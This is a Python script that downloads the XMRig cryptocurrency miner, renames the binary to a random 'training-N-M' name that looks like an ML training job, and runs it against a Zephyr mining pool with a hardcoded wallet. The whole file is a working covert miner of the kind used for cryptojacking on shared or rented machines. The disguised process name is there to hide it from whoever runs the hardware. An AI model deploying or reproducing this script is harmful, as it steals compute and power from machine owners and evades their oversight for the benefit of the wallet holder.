import subprocess
import secrets
import shutil
import os
from pathlib import Path

# Constants
VERSION = "6.21.0"
WORK_DIR = Path.home() / "work"
XMRIg_DIR = WORK_DIR / f"xmrig-{VERSION}"
POOL = "us-zephyr.miningocean.org:5432"
USERNAME = "ZEPHsAMyUCyAY1HthizFxwSyZhMXhpomE7VAsn6wyuVRLDhxBNTjMAoZdHc8j2yjXoScPumfZNjGePHVwVujQiZHjJangKYWriB"
ALGO = "rx/0"
DONATE = "1"
def create_work_dir():
    WORK_DIR.mkdir(parents=True, exist_ok=True)

def download_xmrig():
    url = f"https://github.com/xmrig/xmrig/releases/download/v{VERSION}/xmrig-{VERSION}-linux-x64.tar.gz"
    try:
        subprocess.run(["wget", url, "-P", str(WORK_DIR)], shell=False, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error downloading xmrig: {e}")
        return False
    return True

def extract_xmrig():
    try:
        subprocess.run(["tar", "-xvzf", str(WORK_DIR / f"xmrig-{VERSION}-linux-x64.tar.gz"), "-C", str(WORK_DIR)], shell=False, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error extracting xmrig: {e}")
        return False
    return True

def rename_xmrig():
    xmrig_path = XMRIg_DIR / "xmrig"
    random_name = f"training-{secrets.randbelow(375)}-{secrets.randbelow(259)}"
    shutil.move(str(xmrig_path), str(WORK_DIR / random_name))
    return WORK_DIR / random_name

def set_permissions(xmrig_path):
    os.chmod(str(xmrig_path), 0o755)

def run_xmrig(xmrig_path):
    xmrig_cmd = [
        str(xmrig_path),
        "--donate-level", DONATE,
        "-o", POOL,
        "-u", USERNAME,
        "-a", ALGO,
        "-k", "--tls"
    ]
    try:
        subprocess.run(xmrig_cmd, shell=False, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error running xmrig: {e}")

if __name__ == "__main__":
    create_work_dir()
    if download_xmrig() and extract_xmrig():
        xmrig_path = rename_xmrig()
        set_permissions(xmrig_path)
        run_xmrig(xmrig_path)
